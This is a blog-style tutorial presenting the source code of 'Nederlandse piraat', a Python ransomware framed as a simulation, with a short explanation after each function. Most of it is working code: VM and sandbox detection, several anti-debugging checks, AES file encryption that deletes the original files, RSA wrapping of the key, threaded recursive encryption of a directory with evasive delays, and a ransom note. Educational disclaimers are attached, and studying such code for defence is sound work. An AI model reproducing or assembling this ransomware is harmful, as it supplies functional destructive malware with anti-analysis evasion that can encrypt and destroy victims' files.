Nederlandse piraat **Ransomware**
=================================

**Simulated Ransomware: How It Encrypts Files and Avoids Detection**
====================================================================
![Simulated Ransomware Image](https://www.amazon.com/images/M/MV5BMmQ5ZmQ4ZTQtOTkxMy00OGFiLTg1ZDQtNWJmYWU3YjJmYTczXkEyXkFqcGc@._V1_.jpg)

**Introduction**
----------------

Ransomware is a type of malware that encrypts a victim's files and demands a ransom in exchange for the decryption key. In this article, we will analyze a simulated ransomware example written in Python, which uses advanced encryption techniques (AES and RSA) and anti-analysis methods to make detection and debugging more difficult. The objective is to understand how these techniques work and why they are used.

**Warning**: This code is **for educational purposes only**. The use of ransomware is illegal and unethical. This article is intended for cybersecurity researchers who want to understand how these threats work in order to better combat them.

* * *

**Code Structure**
------------------

The code is divided into several functions, each with a specific purpose. We will analyze each of them in detail.

* * *

### **1\. Virtual Machine (VM) Detection**

    import os
    import random
    import time
    import threading
    import logging
    import platform
    import ctypes
    import sys
    from Crypto.Cipher import AES
    from Crypto.Random import get_random_bytes
    from Crypto.PublicKey import RSA
    from Crypto.Cipher import PKCS1_OAEP
    
    # Obfuscate variable names
    log_filename = 'log.txt'
    key_len = 32
    
    # Log configuration (Obfuscated)
    logging.basicConfig(filename=log_filename, level=logging.ERROR, format='%(asctime)s - %(levelname)s - %(message)s')
    
    # Check for Virtual Machine (Anti-analysis)
    def is_vm():
        vm_signatures = [
            'vmware', 'virtualbox', 'qemu', 'xen', 'vbox', 'hyperv',
            'kvm', 'parallels', 'bhyve', 'openvz', 'lxc', 'wsl',
            'sandbox', 'gvisor', 'firejail'
        ]
        system_info = platform.uname().release.lower()
        for signature in vm_signatures:
            if signature in system_info:
                return True
        return False
    

### **What does it do?**

This function checks if the code is running on a virtual machine (VM). It looks for common hypervisor signatures (such as VMware, VirtualBox, etc.) in the operating system name.

### **Why is it used?**

Security analysts often use VMs to analyze malware in a controlled environment. By detecting a VM, malware can self-destruct or alter its behavior to evade analysis.

* * *

### **2\. Anti-Debugging Techniques**

### **a. Debugger Detection (**`**adbg**`**)**

    # Function to check for a debugger using multiple methods (Obfuscated)
    def adbg():
        # Check if a debugger is present using IsDebuggerPresent
        if ctypes.windll.kernel32.IsDebuggerPresent():
            logging.error("Debugger detected!")
            sys.exit(1)
    
        # Check remote debugger presence using CheckRemoteDebuggerPresent
        ird = ctypes.c_int(0)
        ctypes.windll.kernel32.CheckRemoteDebuggerPresent(ctypes.windll.kernel32.GetCurrentProcess(), ctypes.byref(ird))
        if ird.value:
            logging.error("Remote debugger detected!")
            sys.exit(1)
    
        # Query debug information from the process (NtQueryInformationProcess)
        NTQIP = 0x22  # Arbitrary value for querying process info
        dbg_info = ctypes.c_ulong(0)
        ctypes.windll.ntdll.NtQueryInformationProcess(
            ctypes.windll.kernel32.GetCurrentProcess(),
            NTQIP,
            ctypes.byref(dbg_info),
            ctypes.sizeof(dbg_info),
            None
        )
        if dbg_info.value != 0:
            logging.error("Debug information detected!")
            sys.exit(1)
    

### **What does it do?**

*   Checks if a debugger is present using `IsDebuggerPresent`.

*   Checks for the presence of a remote debugger with `CheckRemoteDebuggerPresent`.

*   Uses `NtQueryInformationProcess` to retrieve process information and detect debugging.

### **Why is it used?**

Debuggers are essential tools for analyzing malware. By detecting a debugger, the malware can terminate its execution to avoid analysis.

* * *

### **b. Hardware Breakpoint Detection (**`**chb**`**)**

    # Check hardware breakpoints (Obfuscated)
    def chb():
        class CTX(ctypes.Structure):
            _fields_ = [("CF", ctypes.c_ulong),
                        ("Dr0", ctypes.c_ulonglong),
                        ("Dr1", ctypes.c_ulonglong),
                        ("Dr2", ctypes.c_ulonglong),
                        ("Dr3", ctypes.c_ulonglong),
                        ("Dr6", ctypes.c_ulonglong),
                        ("Dr7", ctypes.c_ulonglong)]
    
        ctx = CTX()
        ctx.CF = 0x10010  # CONTEXT_DEBUG_REGISTERS
        if ctypes.windll.kernel32.GetThreadContext(ctypes.windll.kernel32.GetCurrentThread(), ctypes.byref(ctx)):
            if ctx.Dr0 or ctx.Dr1 or ctx.Dr2 or ctx.Dr3:
                logging.error("Hardware breakpoints detected!")
                exit(1)
    

### **What does it do?**

Checks if hardware breakpoints are set in the debug registers (`Dr0`, `Dr1`, etc.).

### **Why is it used?**

Hardware breakpoints are used by debuggers to pause code execution at specific points. Detecting them can help malware avoid analysis.

* * *

### **c. Time Delay Detection (**`**ctm**`**)**

    # Function to check for time-based delays (anti-debugging) (Obfuscated)
    def ctm():
        st = time.time()
        for _ in range(100000):  # Simple operation
            pass
        et = time.time()
        if (et - st) > 0.1:  # If there is a significant delay
            logging.error("Timing analysis detected!")
            exit(1)
    

### **What does it do?**

Measures the execution time of a simple operation. If there is a significant delay, this may indicate the presence of a debugger.

### **Why is it used?**

Debuggers can introduce delays in code execution. This technique helps detect such delays.

* * *

### **3\. File Encryption**

### **a. AES Key Generation (**`**gn_k**`**)**

    def gn_k():
        return get_random_bytes(key_len)
    

### **What does it do?**

Generates a 32-byte (256-bit) AES key using `get_random_bytes`.

### **Why is it used?**

AES is a fast and secure symmetric encryption algorithm. The key is randomly generated to ensure that each malware execution is unique.

* * *

### **b. File Encryption (**`**prc_f**`**)**

    # Function to encrypt files (Obfuscated)
    def prc_f(f, k):
        try:
            chk_k(k)
            
            with open(f, 'rb') as fo:
                data = fo.read()
    
            cipher = AES.new(k, AES.MODE_EAX)
            ct, tag = cipher.encrypt_and_digest(data)
    
            with open(f + ".enc", 'wb') as ef:
                [ef.write(x) for x in (cipher.nonce, tag, ct)]
    
            os.remove(f)
            print(f"File '{f}' encrypted and removed.")
        except FileNotFoundError:
            logging.error(f"File not found: {f}")
        except PermissionError:
            logging.error(f"Permission denied: {f}")
        except ValueError as ve:
            logging.error(f"Validation error: {ve}")
        except Exception as e:
            logging.error(f"Error encrypting {f}: {e}")
    

### **What does it do?**

*   Reads the file content.

*   Encrypts the content using AES in EAX mode.

*   Saves the encrypted file with the `.enc` extension.

*   Removes the original file.

### **Why is it used?**

The EAX mode provides authentication and confidentiality, ensuring that files cannot be decrypted without the correct key.

* * *

### **4\. Ransom Note**

    msg = "".join(["# YOUR FILES HAVE BEEN", " ENCRYPTED! Contact", " us at ", "email@example.com"])
    with open(os.path.join(d, "RANSOM_NOTE.txt"), "w") as rf:
        rf.write(msg)
    

### **What does it do?**

Creates a `RANSOM_NOTE.txt` file in the target directory, informing the victim that their files have been encrypted.

### **Why is it used?**

This is a common characteristic of ransomware, where attackers instruct the victim to pay a ransom to recover their files.

* * *

**5\. File Decryption**
-----------------------

### **a. Function** `**dcr_f**` **(Decrypt Files)**

    # Function to decrypt files (Obfuscated)
    def dcr_f(f, k):
        try:
            chk_k(k)
            with open(f, 'rb') as ef:
                nonce, tag, ct = [ef.read(x) for x in (16, 16, -1)]
                cipher = AES.new(k, AES.MODE_EAX, nonce=nonce)
                data = cipher.decrypt_and_verify(ct, tag)
    
            with open(f.replace(".enc", ""), 'wb') as of:
                of.write(data)
            print(f"File '{f}' decrypted.")
        except FileNotFoundError:
            logging.error(f"File not found: {f}")
        except PermissionError:
            logging.error(f"Permission denied: {f}")
        except ValueError as ve:
            logging.error(f"Validation error: {ve}")
        except Exception as e:
            logging.error(f"Error decrypting {f}: {e}")
    

### **What does it do?**

*   Reads the encrypted file (`.enc`).

*   Extracts the nonce, tag, and ciphertext.

*   Decrypts the content using AES in EAX mode.

*   Verifies data integrity using the tag.

*   Saves the decrypted file without the `.enc` extension.

### **Why is it used?**

This function is essential for restoring encrypted files. It demonstrates how symmetric encryption (AES) can be reversed with the correct key.

* * *

### **b. Function** `**gn_k**` **(Generate AES Key)**

    def gn_k():
        return get_random_bytes(key_len)
    

### **What does it do?**

Generates a 32-byte (256-bit) AES key using the `get_random_bytes` function from the `Crypto` library.

### **Why is it used?**

The AES key is the secret required to encrypt and decrypt files. Generating a random key ensures that each execution of the malware is unique.

* * *

**6\. Using RSA for Asymmetric Encryption**
-------------------------------------------

### **a. Function** `**ld_puk**` **(Load RSA Public Key)**

    # Load RSA public key (Obfuscated)
    def ld_puk(p):
        try:
            with open(p, 'rb') as f:
                puk = RSA.import_key(f.read())
            return puk
        except Exception as e:
            logging.error(f"Error loading RSA key: {e}")
    

### **What does it do?**

Loads an RSA public key from a `.pem` file.

### **Why is it used?**

The RSA public key is used to encrypt the AES key, ensuring that only the holder of the corresponding private key can decrypt it.

* * *

### **b. Function** `**enc_k**` **(Encrypt AES Key with RSA)**

    # Encrypt AES key with RSA (Obfuscated)
    def enc_k(symk, rsapub):
        try:
            crsa = PKCS1_OAEP.new(rsapub)
            return crsa.encrypt(symk)
        except Exception as e:
            logging.error(f"Error encrypting key: {e}")
    

### **What does it do?**

Encrypts the AES key using the RSA public key with the PKCS1\_OAEP encryption scheme.

### **Why is it used?**

This technique allows the AES key to be securely transmitted or stored, as only the RSA private key can decrypt it.

* * *

### **c. Function** `**ld_prk**` **(Load RSA Private Key)**

    # Load RSA private key (Obfuscated)
    def ld_prk(p):
        try:
            with open(p, 'rb') as f:
                prk = RSA.import_key(f.read())
            return prk
        except Exception as e:
            logging.error(f"Error loading RSA private key: {e}")
    

### **What does it do?**

Loads an RSA private key from a `.pem` file.

### **Why is it used?**

The RSA private key is needed to decrypt the encrypted AES key.

* * *

### **d. Function** `**dcr_k**` **(Decrypt AES Key with RSA)**

    # Decrypt AES key with RSA (Obfuscated)
    def dcr_k(enc_symk, rsapriv):
        try:
            crsa = PKCS1_OAEP.new(rsapriv)
            return crsa.decrypt(enc_symk)
        except Exception as e:
            logging.error(f"Error decrypting key: {e}")
    

### **What does it do?**

Decrypts the AES key using the RSA private key.

### **Why is it used?**

This function is crucial for recovering the AES key and, consequently, decrypting the files.

* * *

**7\. Loading File Extensions**
-------------------------------

### **Function** `**ld_ext**` **(Load File Extensions)**

    # Function to load file extensions (Obfuscated)
    def ld_ext(p):
        try:
            with open(p, 'r') as f:
                ext = f.read().splitlines()
            return tuple(ext)
        except Exception as e:
            logging.error(f"Error loading extensions: {e}")
            return ()
    

### **What does it do?**

Loads a list of file extensions from a text file (`extensions.txt`).

### **Why is it used?**

Allows the malware to encrypt only files with specific extensions (e.g., `.txt`, `.docx`, `.jpg`), increasing its efficiency.

* * *

**8\. Directory Infection with Threads**
----------------------------------------

### **Function** `**inf_d**` **(Encrypt Directory)**

    # Encrypt files with threads (Obfuscated)
    def inf_d(d, k, ext):
        try:
            ths = []
            for r, dirs, fs in os.walk(d):
                for f in fs:
                    fp = os.path.join(r, f)
                    if not f.endswith(".enc") and f.lower().endswith(ext):
                        t = threading.Thread(target=prc_f, args=(fp, k))
                        ths.append(t)
                        t.start()
                        time.sleep(random.uniform(1, 2))  # Add sleep to simulate delay and evade analysis
    
            for t in ths:
                t.join()
    
            msg = "".join(["# YOUR FILES HAVE BEEN", " ENCRYPTED! Contact", " us at ", "email@example.com"])
            with open(os.path.join(d, "RANSOM_NOTE.txt"), "w") as rf:
                rf.write(msg)
            print("Ransom note created.")
        except Exception as e:
            logging.error(f"Error during infection: {e}")
    

### **What does it do?**

*   Recursively traverses the target directory.

*   Encrypts files with the specified extensions using threads.

*   Adds a random delay between encryptions to hinder dynamic analysis.

*   Creates a ransom note (`RANSOM_NOTE.txt`).

### **Why is it used?**

Using threads allows multiple files to be encrypted simultaneously, increasing malware efficiency. The random delay helps avoid detection by monitoring systems.

* * *

**9\. File Restoration**
------------------------

### **Function** `**rst_f**` **(Restore Files)**

    # Restore files (Obfuscated)
    def rst_f(d, k):
        try:
            for r, dirs, fs in os.walk(d):
                for f in fs:
                    if f.endswith(".enc"):
                        dcr_f(os.path.join(r, f), k)
        except Exception as e:
            logging.error(f"Error restoring files: {e}")
    

### **What does it do?**

It scans the target directory and decrypts all files with the `.enc` extension.

### **Why is it used?**

This function is used to simulate the restoration of files after ransom payment (or for testing purposes).

* * *

**10\. Main Logic**
-------------------

### **Block** `**if __name__ == "__main__":**`

    # Main
    if __name__ == "__main__":
        print("WARNING: Educational purpose only.")
        
        # Anti-analysis: Exit if running in VM
        if is_vm():
            print("Running in a VM, exiting...")
            exit()
    
        # Run anti-debugging checks
        adbg()
        chb()
        ctm()
    
        input("Press Enter to continue (Ctrl+C to cancel)...")
        
        aes_k = gn_k()  # Generate AES key
    
        # Load public RSA key
        pub_k_path = "public_key.pem"
        pub_k = ld_puk(pub_k_path)
        
        # Encrypt the AES key
        enc_aes_k = enc_k(aes_k, pub_k)
    
        # Load extensions
        ext_path = "extensions.txt"
        exts = ld_ext(ext_path)
    
        # Target directory for encryption
        target_dir = "C:\\TestFolder"  # Update to your target
    
        # Encrypt the directory
        inf_d(target_dir, aes_k, exts)
    
        # Simulate storing the encrypted AES key
        with open("encrypted_aes_key.bin", "wb") as f:
            f.write(enc_aes_k)
    
        # Load private RSA key
        priv_k_path = "private_key.pem"
        priv_k = ld_prk(priv_k_path)
    
        # Decrypt the AES key
        with open("encrypted_aes_key.bin", "rb") as f:
            enc_aes_k = f.read()
        aes_k = dcr_k(enc_aes_k, priv_k)
    
        # Restore files for simulation purposes
        rst_f(target_dir, aes_k)
        
        print("Process completed.")
    

### **What does it do?**

*   Checks if the code is running in a VM.

*   Runs anti-debugging checks.

*   Generates an AES key and encrypts it using the RSA public key.

*   Encrypts files in the target directory.

*   Stores the encrypted AES key.

*   Decrypts the AES key and restores files for simulation purposes.

### **Why is it used?**

This is the main logic of the program, orchestrating all the functionalities described above.

* * *

**Conclusion**
--------------

This code is a complete example of how ransomware can be implemented, using advanced encryption and anti-analysis techniques. As cybersecurity researchers, it is essential to understand these techniques to develop effective defenses against real threats.

To learn how to generate public and private keys, visit: [https://thekogami.medium.com/first-act-preparation-and-encryption-f239ab1b8695](https://thekogami.medium.com/first-act-preparation-and-encryption-f239ab1b8695)

**Remember:** Using this code for malicious purposes is illegal. This article is for educational and research purposes only.

* * *

**References**
--------------

*   Van Hoof, L. (n.d.). _PyCryptodome documentation_. Retrieved March 11, 2025, from [https://pycryptodome.readthedocs.io/](https://pycryptodome.readthedocs.io/)

*   Kogami. (2025). _Nederlandse Piraat — Ransomware Simulation_. Available at: [https://github.com/thekogami/Nederlandse-piraat](https://github.com/thekogami/Nederlandse-piraat)

I hope this complete manual has been helpful! If you have any questions or suggestions, feel free to comment. Best regards, **Felipe 🚀**

* * *
